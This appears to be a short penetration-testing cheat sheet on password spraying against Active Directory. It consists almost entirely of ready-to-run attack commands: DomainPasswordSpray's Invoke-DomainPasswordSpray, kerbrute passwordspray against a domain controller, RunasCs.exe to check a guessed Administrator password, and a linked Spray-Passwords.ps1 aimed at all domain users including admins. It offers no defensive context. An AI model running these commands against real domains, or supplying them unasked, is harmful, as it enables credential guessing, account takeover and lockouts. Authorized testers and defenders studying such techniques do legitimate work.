---
legal-banner: true
---

### **Using DomainPasswordSpray.ps1**

1. Import the DomainPasswordSpray module:  
   ```powershell
   Import-Module .\DomainPasswordSpray.ps1
   ```

2. Run `Invoke-DomainPasswordSpray` with the desired password and output file parameters:  
   ```powershell
   Invoke-DomainPasswordSpray -Password [PASSWORD] -OutFile spray_success -ErrorAction SilentlyContinue
   ```

### **Using Kerbrute for Password Spraying**

1. Execute the password spray attack:  
   ```bash
   kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]
   ```

### **Using RunasCs.exe**

1. Validate credentials locally without requiring SMB, LDAP, WinRM, Kerberos, or other authenticated services:  
   ```bash
   .\RunasCs.exe Administrator notthepassword "cmd /c whoami"
   ```

2. Use the `spray-passwords.ps1` script: [Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)  

   Example usage to test passwords against all users in AD, including admins:  

   ```powershell
   .\spray-passwords.ps1 -Admin -Pass IamUser01
   .\spray-passwords.ps1 -Admin -Pass IamUser02
   ```
